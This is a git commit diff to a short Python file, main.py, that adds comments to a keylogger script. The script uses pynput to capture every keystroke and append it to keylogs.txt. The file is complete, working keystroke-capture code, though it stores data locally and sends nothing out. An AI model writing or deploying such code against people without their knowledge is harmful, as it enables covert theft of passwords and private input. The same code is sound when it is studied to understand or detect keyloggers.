4ff2d26b644a9b9de6fa40d662441dde01660227
Thamidu-Nadun <138709475+Thamidu-Nadun@users.noreply.github.com>
2023-07-31 11:35:23 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,8 +1,10 @@
+
+# import some methods in keyboard 
 from pynput.keyboard import Key, Listener
 
 def on_press(key):
     with open("keylogs.txt", "a") as f:
-        f.write(str(key) + "\n")
+        f.write(str(key) + "\n")#write data
 
 with Listener(on_press=on_press) as listener:
     listener.join()
